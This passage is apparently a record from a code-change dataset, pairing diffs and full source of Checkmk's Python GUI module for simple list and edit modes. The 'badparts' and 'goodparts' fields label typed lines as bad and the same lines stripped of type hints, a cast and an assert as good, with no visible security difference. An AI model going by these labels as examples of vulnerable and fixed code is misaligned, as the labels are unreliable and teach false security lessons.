_show_entry_cells(self, table: Table, ident: str, entry: GroupSpec) -> None:\n         else:\n             html.write_text(\", \".join([self._contact_group_alias(g) for g in entry[\"shared_with\"]]))\n \n-    def _contact_group_alias(self, name: str) -> str:\n+    def _contact_group_alias(self, name):\n         return self._contact_groups.get(name, {\"alias\": name})[\"alias\"]\n \n \n-class ModeEditPredefinedCondition(SimpleEditMode[GroupSpec]):\n+class ModeEditPredefinedCondition(SimpleEditMode):\n     @classmethod\n     def name(cls) -> str:\n         return \"edit_predefined_condition\"\n@@ -269,7 +274,7 @@ def _vs_individual_elements(self):\n             ),\n         ]\n \n-    def _save(self, entries: dict[str, GroupSpec]) -> None:\n+    def _save(self, entries):\n         # In case it already existed before, remember the previous path\n         old_entries = self._store.load_for_reading()\n         old_path = None\n@@ -278,7 +283,6 @@ def _save(self, entries: dict[str, GroupSpec]) -> None:\n \n         super()._save(entries)\n \n-        assert self._ident is not None\n         conditions = RuleConditions.from_config(\"\", entries[self._ident][\"conditions\"])\n \n         # Update rules of source folder in case the folder was changed\n@@ -287,7 +291,8 @@ def _save(self, entries: dict[str, GroupSpec]) -> None:\n \n         self._rewrite_rules_for(conditions)\n \n-    def _move_rules_for_conditions(self, conditions: RuleConditions, old_path: str) -> None:\n+    def _move_rules_for_conditions(self, conditions, old_path):\n+        # type (RuleConditions, str) -> None\n         \"\"\"Apply changed folder of predefined condition to rules\"\"\"\n         tree = folder_tree()\n         old_folder = tree.folder(old_path)\n",
            "message": "",
            "files": {
                "/cmk/gui/wato/pages/_simple_modes.py": {
                    "changes": [
                        {
                            "diff": "\n import abc\n import copy\n from collections.abc import Mapping\n-from typing import Any, cast, Generic, TypeVar\n+from typing import Any, Generic, TypeVar\n \n from livestatus import SiteId\n \n",
                            "add": 1,
                            "remove": 1,
                            "filename": "/cmk/gui/wato/pages/_simple_modes.py",
                            "badparts": [
                                "from typing import Any, cast, Generic, TypeVar"
                            ],
                            "goodparts": [
                                "from typing import Any, Generic, TypeVar"
                            ]
                        },
                        {
                            "diff": "\n         )\n \n \n-class SimpleEditMode(_SimpleWatoModeBase[_T], abc.ABC):\n+class SimpleEditMode(_SimpleWatoModeBase, abc.ABC):\n     \"\"\"Base class for edit modes\"\"\"\n \n     @abc.abstractmethod\n",
                            "add": 1,
                            "remove": 1,
                            "filename": "/cmk/gui/wato/pages/_simple_modes.py",
                            "badparts": [
                                "class SimpleEditMode(_SimpleWatoModeBase[_T], abc.ABC):"
                            ],
                            "goodparts": [
                                "class SimpleEditMode(_SimpleWatoModeBase, abc.ABC):"
                            ]
                        },
                        {
                            "diff": "\n         if \"ident\" in config:\n             self._ident = config.pop(\"ident\")\n         assert self._ident is not None\n-        # No typing support from valuespecs here, so we need to cast\n-        self._entry = cast(_T, config)\n+        self._entry = config\n \n         entries = self._store.load_for_modification()\n \n",
                            "add": 1,
                            "remove": 2,
                            "filename": "/cmk/gui/wato/pages/_simple_modes.py",
                            "badparts": [
                                "        self._entry = cast(_T, config)"
                            ],
                            "goodparts": [
                                "        self._entry = config"
                            ]
                        },
                        {
                            "diff": "\n \n             vs = self.valuespec()\n \n-            vs.render_input(\"_edit\", dict(self._entry))\n+            vs.render_input(\"_edit\", self._entry)\n             vs.set_focus(\"_edit\")\n             forms.end()\n ",
                            "add": 1,
                            "remove": 1,
                            "filename": "/cmk/gui/wato/pages/_simple_modes.py",
                            "badparts": [
                                "            vs.render_input(\"_edit\", dict(self._entry))"
                            ],
                            "goodparts": [
                                "            vs.render_input(\"_edit\", self._entry)"
                            ]
                        }
                    ],
                    "source": "\n \"\"\"These modes implement a complete set of modes for managing a set of standard objects Together with WatoSimpleConfigFile() as store class this implements a) A list mode where all objects are shown. All objects can be deleted here. New objects can be created from here. b) A edit mode which can be used to create and edit an object. \"\"\" import abc import copy from collections.abc import Mapping from typing import Any, cast, Generic, TypeVar from livestatus import SiteId import cmk.gui.forms as forms import cmk.gui.watolib.changes as _changes from cmk.gui.breadcrumb import Breadcrumb from cmk.gui.default_name import unique_default_name_suggestion from cmk.gui.exceptions import MKUserError from cmk.gui.htmllib.html import html from cmk.gui.http import request from cmk.gui.i18n import _ from cmk.gui.page_menu import( make_simple_form_page_menu, make_simple_link, PageMenu, PageMenuDropdown, PageMenuEntry, PageMenuSearch, PageMenuTopic, ) from cmk.gui.table import Table, table_element from cmk.gui.type_defs import ActionResult from cmk.gui.utils.flashed_messages import flash from cmk.gui.utils.transaction_manager import transactions from cmk.gui.utils.urls import make_confirm_delete_link, makeuri_contextless from cmk.gui.valuespec import( Checkbox, Dictionary, DictionaryEntry, DocumentationURL, DualListChoice, FixedValue, ID, RuleComment, SetupSiteChoice, TextInput, ) from cmk.gui.watolib.config_domain_name import ABCConfigDomain from cmk.gui.watolib.hosts_and_folders import make_action_link from cmk.gui.watolib.mode import mode_url, redirect, WatoMode from cmk.gui.watolib.simple_config_file import WatoSimpleConfigFile _T=TypeVar(\"_T\", bound=Mapping[str, Any]) class SimpleModeType(Generic[_T], abc.ABC): @abc.abstractmethod def type_name(self) -> str: \"\"\"A GUI globally unique identifier(in singular form) for the managed type of object\"\"\" raise NotImplementedError() @abc.abstractmethod def name_singular(self): \"\"\"Name of the object used. This is used in user visible messages, buttons and titles.\"\"\" raise NotImplementedError() @abc.abstractmethod def is_site_specific(self) -> bool: \"\"\"Whether or not an object of this type is site specific It has a mandatory \"site\" attribute in case it is. \"\"\" raise NotImplementedError() def site_valuespec(self) -> DualListChoice | SetupSiteChoice: return SetupSiteChoice() @abc.abstractmethod def can_be_disabled(self) -> bool: \"\"\"Whether or not an object of this type can be disabled If True the user can set an attribute named \"disabled\" for each object. \"\"\" raise NotImplementedError() @abc.abstractmethod def affected_config_domains(self) -> list[type[ABCConfigDomain]]: \"\"\"List of config domains that are affected by changes to objects of this type\"\"\" raise NotImplementedError() def mode_ident(self) -> str: \"\"\"A GUI wide unique identifier which is used to create the Setup mode identifiers\"\"\" return self.type_name() def list_mode_name(self) -> str: \"\"\"The mode name of the Setup list mode of this object type\"\"\" return \"%ss\" % self.mode_ident() def edit_mode_name(self) -> str: \"\"\"The mode name of the Setup edit mode of this object type\"\"\" return \"edit_%s\" % self.mode_ident() def affected_sites(self, entry: _T) -> list[SiteId] | None: \"\"\"Sites that are affected by changes to objects of this type Returns either a list of sites affected by a change or None. The entry argument is the data object that is currently being handled. In case the objects of this site are site specific it can be used to decide which sites are affected by a change to this object.\"\"\" if self.is_site_specific(): if isinstance(entry[\"site\"], list): return entry[\"site\"] return[entry[\"site\"]] return None class _SimpleWatoModeBase(Generic[_T], WatoMode, abc.ABC): \"\"\"Base for specific Setup modes of different types This is essentially a base class for the SimpleListMode/SimpleEditMode classes. It should not be used directly by specific mode classes. \"\"\" def __init__(self, mode_type: SimpleModeType[_T], store: WatoSimpleConfigFile[_T]) -> None: self._mode_type=mode_type self._store=store super().__init__() def _add_change( self, *, action: str, text: str, affected_sites: list[SiteId] | None, ) -> None: \"\"\"Add a Setup change entry for this object type modifications\"\"\" _changes.add_change( f\"{action}-{self._mode_type.type_name()}\", text, domains=self._mode_type.affected_config_domains(), sites=affected_sites, ) class SimpleListMode(_SimpleWatoModeBase[_T]): \"\"\"Base class for list modes\"\"\" @abc.abstractmethod def _table_title(self) -> str: \"\"\"The user visible title shown on top of the list table\"\"\" raise NotImplementedError() @abc.abstractmethod def _show_entry_cells(self, table: Table, ident: str, entry: _T) -> None: \"\"\"Shows the HTML code for the cells of an object row\"\"\" raise NotImplementedError() def _handle_custom_action(self, action: str) -> ActionResult: \"\"\"Gives the mode the option to implement custom actions This function is called when the action phase is triggered. The action name is given with the _action HTTP variable. It is handed over as first argument to this function. NOTE: The implementation needs to invalidate the transaction ID on it's own. The \"delete\" action is automatically handled by the SimpleListMode implementation. \"\"\" raise MKUserError(\"_action\", _(\"The action '%s' is not implemented\") % action) def page_menu(self, breadcrumb: Breadcrumb) -> PageMenu: return PageMenu( dropdowns=[ PageMenuDropdown( name=self._mode_type.type_name(), title=self._mode_type.name_singular().title(), topics=[ PageMenuTopic( title=self._mode_type.name_singular().title(), entries=[ PageMenuEntry( title=self._new_button_label(), icon_name=\"new\", item=make_simple_link( makeuri_contextless( request, [(\"mode\", self._mode_type.edit_mode_name())], ) ), is_shortcut=True, is_suggested=True, ), ], ), ], ), ], breadcrumb=breadcrumb, inpage_search=PageMenuSearch(), ) def _new_button_label(self) -> str: return _(\"Add %s\") % self._mode_type.name_singular() def action(self) -> ActionResult: if not transactions.transaction_valid(): return None action_var=request.get_str_input(\"_action\") if action_var is None: return None if action_var !=\"delete\": return self._handle_custom_action(action_var) if not transactions.check_transaction(): return redirect(mode_url(self._mode_type.list_mode_name())) entries=self._store.load_for_modification() ident=request.get_ascii_input(\"_delete\") if ident not in entries: raise MKUserError( \"_delete\", _(\"This %s does not exist.\") % self._mode_type.name_singular() ) if ident not in self._store.filter_editable_entries(entries): raise MKUserError( \"_delete\", _(\"You are not allowed to delete this %s.\") % self._mode_type.name_singular(), ) self._validate_deletion(ident, entries[ident]) entry=entries.pop(ident) self._add_change( action=\"delete\", text=_(\"Removed the %s '%s'\") %(self._mode_type.name_singular(), ident), affected_sites=self._mode_type.affected_sites(entry), ) self._store.save(entries) flash(_(\"The %s has been deleted.\") % self._mode_type.name_singular()) return redirect(mode_url(self._mode_type.list_mode_name())) def _validate_deletion(self, ident: str, entry: _T) -> None: \"\"\"Override this to implement custom validations\"\"\" def _delete_confirm_title(self, nr: int) -> str: return _(\"Delete %s def _delete_confirm_message(self) -> str: return \"\" def page(self) -> None: self._show_table(self._store.filter_editable_entries(self._store.load_for_reading())) def _show_table(self, entries: dict[str, _T]) -> None: with table_element(self._mode_type.type_name(), self._table_title()) as table: for nr,(ident, entry) in enumerate( sorted(entries.items(), key=lambda e: e[1][\"title\"]) ): table.row() self._show_row(nr, table, ident, entry) def _show_row(self, nr: int, table: Table, ident: str, entry: _T) -> None: table.cell(\" html.write_text(nr) self._show_action_cell(nr, table, ident, entry) self._show_entry_cells(table, ident, entry) def _show_action_cell(self, nr: int, table: Table, ident: str, entry: _T) -> None: table.cell(_(\"Actions\"), css=[\"buttons\"]) edit_url=makeuri_contextless( request, [ (\"mode\", self._mode_type.edit_mode_name()), (\"ident\", ident), ], ) html.icon_button(edit_url, _(\"Edit this %s\") % self._mode_type.name_singular(), \"edit\") clone_url=makeuri_contextless( request, [ (\"mode\", self._mode_type.edit_mode_name()), (\"clone\", ident), ], ) html.icon_button(clone_url, _(\"Clone this %s\") % self._mode_type.name_singular(), \"clone\") confirm_delete: str=_(\"ID: %s\") % ident if delete_confirm_msg:=self._delete_confirm_message(): confirm_delete +=\"<br><br>\" +delete_confirm_msg delete_url=make_confirm_delete_link( url=make_action_link( [ (\"mode\", self._mode_type.list_mode_name()), (\"_action\", \"delete\"), (\"_delete\", ident), ] ), title=self._delete_confirm_title(nr), suffix=entry[\"title\"], message=confirm_delete, ) html.icon_button( delete_url, _(\"Delete this %s\") % self._mode_type.name_singular(), \"delete\" ) class SimpleEditMode(_SimpleWatoModeBase[_T], abc.ABC): \"\"\"Base class for edit modes\"\"\" @abc.abstractmethod def _vs_individual_elements(self) -> list[DictionaryEntry]: raise NotImplementedError() def _from_vars(self) -> None: ident=request.get_ascii_input(\"ident\") if ident is not None: try: entry=self._store.filter_editable_entries(self._store.load_for_reading())[ident] except KeyError: raise MKUserError( \"ident\", _(\"This %s does not exist.\") % self._mode_type.name_singular() ) self._new=False self._ident: str | None=ident self._entry=entry return clone=request.get_ascii_input(\"clone\") if clone is not None: try: entry=self._store.filter_editable_entries(self._store.load_for_reading())[clone] except KeyError: raise MKUserError( \"clone\", _(\"This %s does not exist.\") % self._mode_type.name_singular() ) self._new=True self._ident=None self._entry=copy.deepcopy(entry) return self._new=True self._ident=None def title(self) -> str: if self._new: return _(\"Add %s\") % self._mode_type.name_singular() return _(\"Edit %s: %s\") %(self._mode_type.name_singular(), self._entry[\"title\"]) def page_menu(self, breadcrumb: Breadcrumb) -> PageMenu: return make_simple_form_page_menu( _(\"Actions\"), breadcrumb, form_name=\"edit\", button_name=\"_save\" ) def valuespec(self) -> Dictionary: general_elements=self._vs_mandatory_elements() general_keys=[k for k, _v in general_elements] individual_elements=self._vs_individual_elements() individual_keys=[k for k, _v in individual_elements] return Dictionary( title=self._mode_type.name_singular().title(), elements=general_elements +individual_elements, optional_keys=self._vs_optional_keys(), show_more_keys=[\"docu_url\"], headers=[ (_(\"General properties\"), general_keys), (_(\"%s properties\") % self._mode_type.name_singular().title(), individual_keys), ], render=\"form\", ) def _vs_mandatory_elements(self) -> list[DictionaryEntry]: ident_attr: list=[] if self._new: ident_attr=[ ( \"ident\", ID( title=_(\"Unique ID\"), help=_( \"The ID must be unique. It acts as internal key \" \"when objects reference it.\" ), default_value=self._default_id, allow_empty=False, size=80, ), ), ] else: ident_attr=[ ( \"ident\", FixedValue( value=self._ident, title=_(\"Unique ID\"), ), ), ] if self._mode_type.is_site_specific(): site_attr=[ (\"site\", self._mode_type.site_valuespec()), ] else: site_attr=[] if self._mode_type.can_be_disabled(): disable_attr=[ ( \"disabled\", Checkbox( title=_(\"Activation\"), help=_( \"Selecting this option will disable the %s, but \" \"it will remain in the configuration.\" ) % self._mode_type.name_singular(), label=_(\"do not activate this %s\") % self._mode_type.name_singular(), ), ), ] else: disable_attr=[] elements=( ident_attr +[ ( \"title\", TextInput( title=_(\"Title\"), help=_(\"Name your %s for easy recognition.\") %(self._mode_type.name_singular()), allow_empty=False, size=80, ), ), (\"comment\", RuleComment()), (\"docu_url\", DocumentationURL()), ] +disable_attr +site_attr ) return elements def _default_id(self) -> str: return unique_default_name_suggestion( self._mode_type.name_singular(), self._store.load_for_reading().keys(), ) def _vs_optional_keys(self) -> list[str]: return[] def action(self) -> ActionResult: if not transactions.transaction_valid(): return redirect(mode_url(self._mode_type.list_mode_name())) vs=self.valuespec() config=vs.from_html_vars(\"_edit\") vs.validate_value(config, \"_edit\") if \"ident\" in config: self._ident=config.pop(\"ident\") assert self._ident is not None self._entry=cast(_T, config) entries=self._store.load_for_modification() if self._new and self._ident in entries: raise MKUserError(\"ident\", _(\"This ID is already in use. Please choose another one.\")) if not self._new and self._ident not in self._store.filter_editable_entries(entries): raise MKUserError( \"ident\", _(\"You are not allowed to edit this %s.\") % self._mode_type.name_singular() ) if self._new: entries[self._ident]=self._entry self._add_change( action=\"add\", text=_(\"Added the %s '%s'\") %(self._mode_type.name_singular(), self._ident), affected_sites=self._mode_type.affected_sites(self._entry), ) else: current_sites=self._mode_type.affected_sites(self._entry) previous_sites=self._mode_type.affected_sites(entries[self._ident]) affected_sites=( None if current_sites is None or previous_sites is None else sorted({*previous_sites, *current_sites}) ) entries[self._ident]=self._entry self._add_change( action=\"edit\", text=_(\"Edited the %s '%s'\") %(self._mode_type.name_singular(), self._ident), affected_sites=affected_sites, ) self._save(entries) return redirect(mode_url(self._mode_type.list_mode_name())) def _save(self, entries: dict[str, _T]) -> None: self._store.save(entries) def page(self) -> None: with html.form_context(\"edit\", method=\"POST\"): html.prevent_password_auto_completion() vs=self.valuespec() vs.render_input(\"_edit\", dict(self._entry)) vs.set_focus(\"_edit\") forms.end() html.hidden_fields() ",
                    "sourceWithComments": "#!/usr/bin/env python3\n# Copyright (C) 2019 Checkmk GmbH - License: GNU General Public License v2\n# This file is part of Checkmk (https://checkmk.com). It is subject to the terms and\n# conditions defined in the file COPYING, which is part of this source code package.\n\"\"\"These modes implement a complete set of modes for managing a set of standard objects\n\nTogether with WatoSimpleConfigFile() as store class this implements\n\na) A list mode where all objects are shown. All objects can be deleted here.\n   New objects can be created from here.\nb) A edit mode which can be used to create and edit an object.\n\"\"\"\n\nimport abc\nimport copy\nfrom collections.abc import Mapping\nfrom typing import Any, cast, Generic, TypeVar\n\nfrom livestatus import SiteId\n\nimport cmk.gui.forms as forms\nimport cmk.gui.watolib.changes as _changes\nfrom cmk.gui.breadcrumb import Breadcrumb\nfrom cmk.gui.default_name import unique_default_name_suggestion\nfrom cmk.gui.exceptions import MKUserError\nfrom cmk.gui.htmllib.html import html\nfrom cmk.gui.http import request\nfrom cmk.gui.i18n import _\nfrom cmk.gui.page_menu import (\n    make_simple_form_page_menu,\n    make_simple_link,\n    PageMenu,\n    PageMenuDropdown,\n    PageMenuEntry,\n    PageMenuSearch,\n    PageMenuTopic,\n)\nfrom cmk.gui.table import Table, table_element\nfrom cmk.gui.type_defs import ActionResult\nfrom cmk.gui.utils.flashed_messages import flash\nfrom cmk.gui.utils.transaction_manager import transactions\nfrom cmk.gui.utils.urls import make_confirm_delete_link, makeuri_contextless\nfrom cmk.gui.valuespec import (\n    Checkbox,\n    Dictionary,\n    DictionaryEntry,\n    DocumentationURL,\n    DualListChoice,\n    FixedValue,\n    ID,\n    RuleComment,\n    SetupSiteChoice,\n    TextInput,\n)\nfrom cmk.gui.watolib.config_domain_name import ABCConfigDomain\nfrom cmk.gui.watolib.hosts_and_folders import make_action_link\nfrom cmk.gui.watolib.mode import mode_url, redirect, WatoMode\nfrom cmk.gui.watolib.simple_config_file import WatoSimpleConfigFile\n\n_T = TypeVar(\"_T\", bound=Mapping[str, Any])\n\n\nclass SimpleModeType(Generic[_T], abc.ABC):\n    @abc.abstractmethod\n    def type_name(self) -> str:\n        \"\"\"A GUI globally unique identifier (in singular form) for the managed type of object\"\"\"\n        raise NotImplementedError()\n\n    @abc.abstractmethod\n    def name_singular(self):\n        \"\"\"Name of the object used. This is used in user visible messages, buttons and titles.\"\"\"\n        raise NotImplementedError()\n\n    @abc.abstractmethod\n    def is_site_specific(self) -> bool:\n        \"\"\"Whether or not an object of this type is site specific\n        It has a mandatory \"site\" attribute in case it is.\n        \"\"\"\n        raise NotImplementedError()\n\n    def site_valuespec(self) -> DualListChoice | SetupSiteChoice:\n        return SetupSiteChoice()\n\n    @abc.abstractmethod\n    def can_be_disabled(self) -> bool:\n        \"\"\"Whether or not an object of this type can be disabled\n\n        If True the user can set an attribute named \"disabled\" for each object.\n        \"\"\"\n        raise NotImplementedError()\n\n    @abc.abstractmethod\n    def affected_config_domains(self) -> list[type[ABCConfigDomain]]:\n        \"\"\"List of config domains that are affected by changes to objects of this type\"\"\"\n        raise NotImplementedError()\n\n    def mode_ident(self) -> str:\n        \"\"\"A GUI wide unique identifier which is used to create the Setup mode identifiers\"\"\"\n        return self.type_name()\n\n    def list_mode_name(self) -> str:\n        \"\"\"The mode name of the Setup list mode of this object type\"\"\"\n        return \"%ss\" % self.mode_ident()\n\n    def edit_mode_name(self) -> str:\n        \"\"\"The mode name of the Setup edit mode of this object type\"\"\"\n        return \"edit_%s\" % self.mode_ident()\n\n    def affected_sites(self, entry: _T) -> list[SiteId] | None:\n        \"\"\"Sites that are affected by changes to objects of this type\n\n        Returns either a list of sites affected by a change or None.\n\n        The entry argument is the data object that is currently being handled. In case\n        the objects of this site are site specific it can be used to decide which sites\n        are affected by a change to this object.\"\"\"\n        if self.is_site_specific():\n            if isinstance(entry[\"site\"], list):\n                return entry[\"site\"]\n            return [entry[\"site\"]]\n        return None\n\n\nclass _SimpleWatoModeBase(Generic[_T], WatoMode, abc.ABC):\n    \"\"\"Base for specific Setup modes of different types\n\n    This is essentially a base class for the SimpleListMode/SimpleEditMode\n    classes. It should not be used directly by specific mode classes.\n    \"\"\"\n\n    def __init__(self, mode_type: SimpleModeType[_T], store: WatoSimpleConfigFile[_T]) -> None:\n        self._mode_type = mode_type\n        self._store = store\n\n        # WatoMode() implicitly calls self._from_vars() which may require self._store\n        # to be set before it is executed. Therefore we execute the super constructor\n        # here.\n        # TODO: Make the _from_vars() mechanism more explicit\n        super().__init__()\n\n    def _add_change(\n        self,\n        *,\n        action: str,\n        text: str,\n        affected_sites: list[SiteId] | None,\n    ) -> None:\n        \"\"\"Add a Setup change entry for this object type modifications\"\"\"\n        _changes.add_change(\n            f\"{action}-{self._mode_type.type_name()}\",\n            text,\n            domains=self._mode_type.affected_config_domains(),\n            sites=affected_sites,\n        )\n\n\nclass SimpleListMode(_SimpleWatoModeBase[_T]):\n    \"\"\"Base class for list modes\"\"\"\n\n    @abc.abstractmethod\n    def _table_title(self) -> str:\n        \"\"\"The user visible title shown on top of the list table\"\"\"\n        raise NotImplementedError()\n\n    @abc.abstractmethod\n    def _show_entry_cells(self, table: Table, ident: str, entry: _T) -> None:\n        \"\"\"Shows the HTML code for the cells of an object row\"\"\"\n        raise NotImplementedError()\n\n    def _handle_custom_action(self, action: str) -> ActionResult:\n        \"\"\"Gives the mode the option to implement custom actions\n\n        This function is called when the action phase is triggered. The action name is given\n        with the _action HTTP variable. It is handed over as first argument to this function.\n\n        NOTE: The implementation needs to invalidate the transaction ID on it's own.\n\n        The \"delete\" action is automatically handled by the SimpleListMode implementation.\n        \"\"\"\n        raise MKUserError(\"_action\", _(\"The action '%s' is not implemented\") % action)\n\n    def page_menu(self, breadcrumb: Breadcrumb) -> PageMenu:\n        return PageMenu(\n            dropdowns=[\n                PageMenuDropdown(\n                    name=self._mode_type.type_name(),\n                    title=self._mode_type.name_singular().title(),\n                    topics=[\n                        PageMenuTopic(\n                            title=self._mode_type.name_singular().title(),\n                            entries=[\n                                PageMenuEntry(\n                                    title=self._new_button_label(),\n                                    icon_name=\"new\",\n                                    item=make_simple_link(\n                                        makeuri_contextless(\n                                            request,\n                                            [(\"mode\", self._mode_type.edit_mode_name())],\n                                        )\n                                    ),\n                                    is_shortcut=True,\n                                    is_suggested=True,\n                                ),\n                            ],\n                        ),\n                    ],\n                ),\n            ],\n            breadcrumb=breadcrumb,\n            inpage_search=PageMenuSearch(),\n        )\n\n    def _new_button_label(self) -> str:\n        return _(\"Add %s\") % self._mode_type.name_singular()\n\n    def action(self) -> ActionResult:\n        if not transactions.transaction_valid():\n            return None\n\n        action_var = request.get_str_input(\"_action\")\n        if action_var is None:\n            return None\n\n        if action_var != \"delete\":\n            return self._handle_custom_action(action_var)\n\n        if not transactions.check_transaction():\n            return redirect(mode_url(self._mode_type.list_mode_name()))\n\n        entries = self._store.load_for_modification()\n\n        ident = request.get_ascii_input(\"_delete\")\n        if ident not in entries:\n            raise MKUserError(\n                \"_delete\", _(\"This %s does not exist.\") % self._mode_type.name_singular()\n            )\n\n        if ident not in self._store.filter_editable_entries(entries):\n            raise MKUserError(\n                \"_delete\",\n                _(\"You are not allowed to delete this %s.\") % self._mode_type.name_singular(),\n            )\n\n        self._validate_deletion(ident, entries[ident])\n\n        entry = entries.pop(ident)\n        self._add_change(\n            action=\"delete\",\n            text=_(\"Removed the %s '%s'\") % (self._mode_type.name_singular(), ident),\n            affected_sites=self._mode_type.affected_sites(entry),\n        )\n        self._store.save(entries)\n\n        flash(_(\"The %s has been deleted.\") % self._mode_type.name_singular())\n        return redirect(mode_url(self._mode_type.list_mode_name()))\n\n    def _validate_deletion(self, ident: str, entry: _T) -> None:\n        \"\"\"Override this to implement custom validations\"\"\"\n\n    def _delete_confirm_title(self, nr: int) -> str:\n        return _(\"Delete %s #%d\") % (self._mode_type.name_singular(), nr)\n\n    def _delete_confirm_message(self) -> str:\n        return \"\"\n\n    def page(self) -> None:\n        self._show_table(self._store.filter_editable_entries(self._store.load_for_reading()))\n\n    def _show_table(self, entries: dict[str, _T]) -> None:\n        with table_element(self._mode_type.type_name(), self._table_title()) as table:\n            for nr, (ident, entry) in enumerate(\n                sorted(entries.items(), key=lambda e: e[1][\"title\"])\n            ):\n                table.row()\n                self._show_row(nr, table, ident, entry)\n\n    def _show_row(self, nr: int, table: Table, ident: str, entry: _T) -> None:\n        table.cell(\"#\", css=[\"narrow nowrap\"])\n        html.write_text(nr)\n\n        self._show_action_cell(nr, table, ident, entry)\n        self._show_entry_cells(table, ident, entry)\n\n    def _show_action_cell(self, nr: int, table: Table, ident: str, entry: _T) -> None:\n        table.cell(_(\"Actions\"), css=[\"buttons\"])\n\n        edit_url = makeuri_contextless(\n            request,\n            [\n                (\"mode\", self._mode_type.edit_mode_name()),\n                (\"ident\", ident),\n            ],\n        )\n        html.icon_button(edit_url, _(\"Edit this %s\") % self._mode_type.name_singular(), \"edit\")\n\n        clone_url = makeuri_contextless(\n            request,\n            [\n                (\"mode\", self._mode_type.edit_mode_name()),\n                (\"clone\", ident),\n            ],\n        )\n        html.icon_button(clone_url, _(\"Clone this %s\") % self._mode_type.name_singular(), \"clone\")\n\n        confirm_delete: str = _(\"ID: %s\") % ident\n        if delete_confirm_msg := self._delete_confirm_message():\n            confirm_delete += \"<br><br>\" + delete_confirm_msg\n        delete_url = make_confirm_delete_link(\n            url=make_action_link(\n                [\n                    (\"mode\", self._mode_type.list_mode_name()),\n                    (\"_action\", \"delete\"),\n                    (\"_delete\", ident),\n                ]\n            ),\n            title=self._delete_confirm_title(nr),\n            suffix=entry[\"title\"],\n            message=confirm_delete,\n        )\n        html.icon_button(\n            delete_url, _(\"Delete this %s\") % self._mode_type.name_singular(), \"delete\"\n        )\n\n\nclass SimpleEditMode(_SimpleWatoModeBase[_T], abc.ABC):\n    \"\"\"Base class for edit modes\"\"\"\n\n    @abc.abstractmethod\n    def _vs_individual_elements(self) -> list[DictionaryEntry]:\n        raise NotImplementedError()\n\n    def _from_vars(self) -> None:\n        ident = request.get_ascii_input(\"ident\")\n        if ident is not None:\n            try:\n                entry = self._store.filter_editable_entries(self._store.load_for_reading())[ident]\n            except KeyError:\n                raise MKUserError(\n                    \"ident\", _(\"This %s does not exist.\") % self._mode_type.name_singular()\n                )\n\n            self._new = False\n            self._ident: str | None = ident\n            self._entry = entry\n            return\n\n        clone = request.get_ascii_input(\"clone\")\n        if clone is not None:\n            try:\n                entry = self._store.filter_editable_entries(self._store.load_for_reading())[clone]\n            except KeyError:\n                raise MKUserError(\n                    \"clone\", _(\"This %s does not exist.\") % self._mode_type.name_singular()\n                )\n\n            self._new = True\n            self._ident = None\n            self._entry = copy.deepcopy(entry)\n            return\n\n        self._new = True\n        self._ident = None\n\n    def title(self) -> str:\n        if self._new:\n            return _(\"Add %s\") % self._mode_type.name_singular()\n        return _(\"Edit %s: %s\") % (self._mode_type.name_singular(), self._entry[\"title\"])\n\n    def page_menu(self, breadcrumb: Breadcrumb) -> PageMenu:\n        return make_simple_form_page_menu(\n            _(\"Actions\"), breadcrumb, form_name=\"edit\", button_name=\"_save\"\n        )\n\n    def valuespec(self) -> Dictionary:\n        general_elements = self._vs_mandatory_elements()\n        general_keys = [k for k, _v in general_elements]\n\n        individual_elements = self._vs_individual_elements()\n        individual_keys = [k for k, _v in individual_elements]\n\n        return Dictionary(\n            title=self._mode_type.name_singular().title(),\n            elements=general_elements + individual_elements,\n            optional_keys=self._vs_optional_keys(),\n            show_more_keys=[\"docu_url\"],\n            headers=[\n                (_(\"General properties\"), general_keys),\n                (_(\"%s properties\") % self._mode_type.name_singular().title(), individual_keys),\n            ],\n            render=\"form\",\n        )\n\n    def _vs_mandatory_elements(self) -> list[DictionaryEntry]:\n        ident_attr: list = []\n        if self._new:\n            ident_attr = [\n                (\n                    \"ident\",\n                    ID(\n                        title=_(\"Unique ID\"),\n                        help=_(\n                            \"The ID must be unique. It acts as internal key \"\n                            \"when objects reference it.\"\n                        ),\n                        default_value=self._default_id,\n                        allow_empty=False,\n                        size=80,\n                    ),\n                ),\n            ]\n        else:\n            ident_attr = [\n                (\n                    \"ident\",\n                    FixedValue(\n                        value=self._ident,\n                        title=_(\"Unique ID\"),\n                    ),\n                ),\n            ]\n\n        if self._mode_type.is_site_specific():\n            site_attr = [\n                (\"site\", self._mode_type.site_valuespec()),\n            ]\n        else:\n            site_attr = []\n\n        if self._mode_type.can_be_disabled():\n            disable_attr = [\n                (\n                    \"disabled\",\n                    Checkbox(\n                        title=_(\"Activation\"),\n                        help=_(\n                            \"Selecting this option will disable the %s, but \"\n                            \"it will remain in the configuration.\"\n                        )\n                        % self._mode_type.name_singular(),\n                        label=_(\"do not activate this %s\") % self._mode_type.name_singular(),\n                    ),\n                ),\n            ]\n        else:\n            disable_attr = []\n\n        elements = (\n            ident_attr\n            + [\n                (\n                    \"title\",\n                    TextInput(\n                        title=_(\"Title\"),\n                        help=_(\"Name your %s for easy recognition.\")\n                        % (self._mode_type.name_singular()),\n                        allow_empty=False,\n                        size=80,\n                    ),\n                ),\n                (\"comment\", RuleComment()),\n                (\"docu_url\", DocumentationURL()),\n            ]\n            + disable_attr\n            + site_attr\n        )\n\n        return elements\n\n    def _default_id(self) -> str:\n        return unique_default_name_suggestion(\n            self._mode_type.name_singular(),\n            self._store.load_for_reading().keys(),\n        )\n\n    def _vs_optional_keys(self) -> list[str]:\n        return []\n\n    def action(self) -> ActionResult:\n        if not transactions.transaction_valid():\n            return redirect(mode_url(self._mode_type.list_mode_name()))\n\n        vs = self.valuespec()\n\n        config = vs.from_html_vars(\"_edit\")\n        vs.validate_value(config, \"_edit\")\n\n        if \"ident\" in config:\n            self._ident = config.pop(\"ident\")\n        assert self._ident is not None\n        # No typing support from valuespecs here, so we need to cast\n        self._entry = cast(_T, config)\n\n        entries = self._store.load_for_modification()\n\n        if self._new and self._ident in entries:\n            raise MKUserError(\"ident\", _(\"This ID is already in use. Please choose another one.\"))\n\n        if not self._new and self._ident not in self._store.filter_editable_entries(entries):\n            raise MKUserError(\n                \"ident\", _(\"You are not allowed to edit this %s.\") % self._mode_type.name_singular()\n            )\n\n        if self._new:\n            entries[self._ident] = self._entry\n            self._add_change(\n                action=\"add\",\n                text=_(\"Added the %s '%s'\") % (self._mode_type.name_singular(), self._ident),\n                affected_sites=self._mode_type.affected_sites(self._entry),\n            )\n        else:\n            current_sites = self._mode_type.affected_sites(self._entry)\n            previous_sites = self._mode_type.affected_sites(entries[self._ident])\n\n            affected_sites = (\n                None\n                if current_sites is None or previous_sites is 